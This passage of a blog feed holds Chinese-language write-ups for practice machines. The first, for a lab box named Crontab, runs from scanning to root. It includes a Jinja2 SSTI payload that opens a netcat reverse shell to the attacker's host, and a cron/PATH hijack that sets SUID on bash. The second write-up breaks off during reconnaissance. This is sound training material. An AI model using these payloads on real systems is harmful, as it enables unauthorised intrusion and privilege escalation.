class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,5000 192.168.2.7<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-09 10:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.7<br>Host is up (0.00090s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">5000/tcp open  upnp?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Server: Werkzeug/3.1.3 Python/3.9.2</span><br><span class="hljs-string">|     Date: Tue, 09 Sep 2025 02:09:38 GMT</span><br><span class="hljs-string">|     Content-Type: text/html; charset=utf-8</span><br><span class="hljs-string">|     Content-Length: 532</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">|     &lt;head&gt;</span><br><span class="hljs-string">|     &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;p1&gt;</span><br><span class="hljs-string">|     Marisa</span><br><span class="hljs-string">|     DAZE&lt;/p1&gt;</span><br><span class="hljs-string">|     &lt;br&gt;</span><br><span class="hljs-string">|     &lt;br&gt; </span><br><span class="hljs-string">|     &lt;p1&gt;</span><br><span class="hljs-string">|     Marisa</span><br><span class="hljs-string">|     (bushi&lt;/p1&gt;</span><br><span class="hljs-string">|     &lt;br&gt;</span><br><span class="hljs-string">|     &lt;br&gt;</span><br><span class="hljs-string">|     &lt;p1&gt;Marisa</span><br><span class="hljs-string">|     &lt;/p1&gt;</span><br><span class="hljs-string">|     &lt;br&gt;</span><br><span class="hljs-string">|     &lt;br&gt;</span><br><span class="hljs-string">|     &lt;p1&gt;</span><br><span class="hljs-string">|     &lt;/p1&gt;</span><br><span class="hljs-string">|     &lt;br&gt;</span><br><span class="hljs-string">|     &lt;img src=&quot;/static/1.png&quot;&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|     &lt;/html&gt;</span><br><span class="hljs-string">|   RTSPRequest: </span><br><span class="hljs-string">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class="hljs-string">|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;head&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="hljs-string">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="hljs-string">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="hljs-string">|     &lt;p&gt;Message: Bad request version (&#x27;</span>RTSP/1.0<span class="hljs-string">&#x27;).&lt;/p&gt;</span><br><span class="hljs-string">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|_    &lt;/html&gt;</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version,</span><br><span class="hljs-string">...</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 94.95 seconds</span><br></code></pre></td></tr></table></figure><ol><li><strong>22端口:ssh服务</strong>，版本为<code>OpenSSH 8.4p1</code>，用于远程登录</li><li><strong>80端口:http服务</strong></li><li><strong>5000端口</strong>，<code>Server: Werkzeug/3.1.3 Python/3.9.2</code>，猜测可能是python编写的框架</li></ol><h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# nmap -sU --top-ports 100 192.168.2.7                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-09 10:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.7<br>Host is up (0.0012s latency).<br>All 100 scanned ports on 192.168.2.7 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 55 closed udp ports (port-unreach), 45 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:05:3E:D8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 50.64 seconds<br></code></pre></td></tr></table></figure><p>没有开放的udp端口</p><h3 id="4-漏洞脚本扫描"><a href="#4-漏洞脚本扫描" class="headerlink" title="4.漏洞脚本扫描"></a>4.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# nmap --script=vuln -p22,80,5000 192.168.2.7                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-09 10:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.7<br>Host is up (0.00090s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">5000/tcp open  upnp</span><br><span class="hljs-string">MAC Address: 08:00:27:05:3E:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.36 seconds</span><br></code></pre></td></tr></table></figure><p>没有新的东西</p><h1 id="二、web渗透"><a href="#二、web渗透" class="headerlink" title="二、web渗透"></a>二、web渗透</h1><h2 id="1、80端口-http服务"><a href="#1、80端口-http服务" class="headerlink" title="1、80端口-http服务"></a>1、80端口-http服务</h2><p>访问80端口，发现是一个静态页面，无利用点；进行目录扫描，也未发现任何有用的信息。</p><h2 id="2、5000端口"><a href="#2、5000端口" class="headerlink" title="2、5000端口"></a>2、5000端口</h2><p>访问5000端口，得到一个用户<code>marisa</code>，并通过提示猜测可能是存在<code>ssti注入</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509091247306.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.7:5000&quot;</span><br>...<br>Target: http://192.168.2.7:5000/<br>[10:39:33] Starting: <br>[10:40:05] 400 -  167B  - /console<br>[10:40:17] 200 -  179B  - /home<br>[10:40:22] 200 -  194B  - /library<br></code></pre></td></tr></table></figure><p>找到目录：<code>/home、/library</code></p><ol><li><p>访问<code>/home</code>目录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509091249098.png"><br>确认了我们之前的猜测，存在<code>ssti注入</code>，并且参数为<code>touhou</code>，现在需要找到存在注入的页面</p></li><li><p>访问<code>/library</code>目录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509091251081.png"><br>结合上面所给出的信息，猜测该页面存在<code>ssti注入</code></p></li><li><p>验证是否存在<code>ssti注入</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509091252598.png"><br>能够回显，说明存在<code>ssti注入</code></p></li></ol><h1 id="三、SSTI注入利用"><a href="#三、SSTI注入利用" class="headerlink" title="三、SSTI注入利用"></a>三、SSTI注入利用</h1><p>尝试看是否会进行解析<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509101728203.png"><br>发现有WAF拦截，过滤了<code>&#123;&#123;</code></p><p>直接使用<code>jinfeng</code>进行绕过<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509101743478.png"><br>提示绕过成功，可以执行shell指令</p><p>尝试执行<code>id</code>，成功回显<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509101743503.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">方案二<br>使用&#123;% %&#125;进行替代<br>&#123;% <span class="hljs-built_in">set</span> x=10-1 %&#125;&#123;% <span class="hljs-built_in">print</span>(x) %&#125;<br>Payload：<br>&#123;% <span class="hljs-built_in">set</span> x=().__class__.__bases__[0].__subclasses__() [104].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;b usybox nc 192.168.2.4 4444 -e /bin/bash&#x27;</span>) %&#125;<br></code></pre></td></tr></table></figure><h1 id="四、获取shell"><a href="#四、获取shell" class="headerlink" title="四、获取shell"></a>四、获取shell</h1><p>直接反弹shell即可<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509101738201.png"></p><p>获到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# nc -lvnp 4444                        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.7] 54272<br><span class="hljs-built_in">id</span><br>uid=1000(marisa) gid=1000(marisa) <span class="hljs-built_in">groups</span>=1000(marisa)<br></code></pre></td></tr></table></figure><p>获取稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、定时任务"><a href="#1、定时任务" class="headerlink" title="1、定时任务"></a>1、定时任务</h2><p>根据靶机的名字，首先查看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">marisa@Crontab:~$ <span class="hljs-built_in">cat</span> /etc/crontab <br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br>* * * * * root master_spark<br></code></pre></td></tr></table></figure><p>发现<code>master_spark</code>是以<code>root</code>权限每分钟执行一次，并且没有绝对路径</p><p>当在Linux中执行一个没有绝对路径的命令时，会依次去<code>PATH</code>环境中进行查找</p><h2 id="2、PATH写入"><a href="#2、PATH写入" class="headerlink" title="2、PATH写入"></a>2、PATH写入</h2><p>查看<code>path</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">marisa@Crontab:~$ <span class="hljs-built_in">ls</span> -la /usr/local/sbin<br>total 8<br>drwxrwxrwx  2 root root 4096 Sep  8 03:39 .<br>drwxr-xr-x 10 root root 4096 Mar 18 20:26 ..<br></code></pre></td></tr></table></figure><p>发现具有写入权限</p><p>那么直接在目录创建<code>master_spark</code>，写入提权命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">marisa@Crontab:~$ <span class="hljs-built_in">cd</span> /usr/local/sbin<br>marisa@Crontab:/usr/local/sbin$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; master_spark<br>marisa@Crontab:/usr/local/sbin$ <span class="hljs-built_in">chmod</span> +x  master_spark <br></code></pre></td></tr></table></figure><h2 id="3、获取ROOT权限"><a href="#3、获取ROOT权限" class="headerlink" title="3、获取ROOT权限"></a>3、获取ROOT权限</h2><p>等待1分钟后查看<code>/bin/bash</code>属性，发现已经具有<code>suid</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">marisa@Crontab:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure><p>直接提权即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">marisa@Crontab:~$ /bin/bash -p<br>bash-5.0# <span class="hljs-built_in">id</span>;<span class="hljs-built_in">whoami</span><br>uid=1000(marisa) gid=1000(marisa) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(marisa)<br>root<br></code></pre></td></tr></table></figure><h1 id="六、获取FLAG"><a href="#六、获取FLAG" class="headerlink" title="六、获取FLAG"></a>六、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /home/marisa/user.txt /root/root.txt <br>flag&#123;marisa marisa-master spark&#125;<br>flag&#123;touhou sai gao&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti注入</tag>
      
      <tag>提权-crontab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Helpdesk</title>
    <link href="/Hackmyvm/Helpdesk/"/>
    <url>/Hackmyvm/Helpdesk/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://hackmyvm.eu/machines/machine.php?vm=Helpdesk">https://hackmyvm.eu/machines/machine.php?vm=Helpdesk</a></li><li>WP编写参考：<a href="https://7r1umphk.github.io/post/hmv_helpdesk.html">https://7r1umphk.github.io/post/hmv_helpdesk.html</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-23 22:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00095s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00094s latency).<br>MAC Address: 08:00:27:5B:85:1F (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.72<br>Host is up (0.0018s latency).<br>MAC Address: 08:00:27:E5:04:39 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.01 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.72</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.72                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-23 22:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.72<br>Host is up (0.00043s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:E5:04:39 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.70 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.72<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.72<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 b4:bc:42:f6:d0:a7:0d:fd:71:01:3d:8a:c5:0c:ac:e3 (ECDSA)<br>|_  256 71:90:08:58:14:04:09:d5:cf:31:ee:87:17:ad:29:8f (ED25519)<br>80/tcp open  http    Apache httpd<br>|_http-title: HelpDesk Ticket System<br>|_http-server-header: Apache<br>MAC Address: 08:00:27:E5:04:39 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.86 seconds<br></code></pre></td></tr></table></figure><ol><li><strong>22端口：ssh服务</strong>，版本为<code>OpenSSH 9.6p1</code></li><li><strong>80端口：http服务</strong>，版本为<code>Apache httpd</code>，网站标题<code>HelpDesk Ticket System</code></li></ol><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sU --top-ports 100 192.168.2.72                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-23 22:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.72<br>Host is up (0.00072s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:E5:04:39 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 109.07 seconds<br></code></pre></td></tr></table></figure><p>没有开放的UDP端口</p><h3 id="4-脚本漏洞扫描"><a href="#4-脚本漏洞扫描" class="headerlink" title="4.脚本漏洞扫描"></a>4.脚本漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p22,80 192.168.2.72         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-23 22:57 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.72<br>Host is up (0.00077s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-cookie-flags: <br>|   /login.php: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /login.php: Possible admin folder</span><br><span class="hljs-string">|_  /helpdesk/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">MAC Address: 08:00:27:E5:04:39 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.36 seconds</span><br></code></pre></td></tr></table></figure><p>找到两个有用的目录<code>/login.php，/helpdesk/</code></p><h2 id="3、WEB目录扫描"><a href="#3、WEB目录扫描" class="headerlink" title="3、WEB目录扫描"></a>3、WEB目录扫描</h2><p>根据扫到的两个目录，再次进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 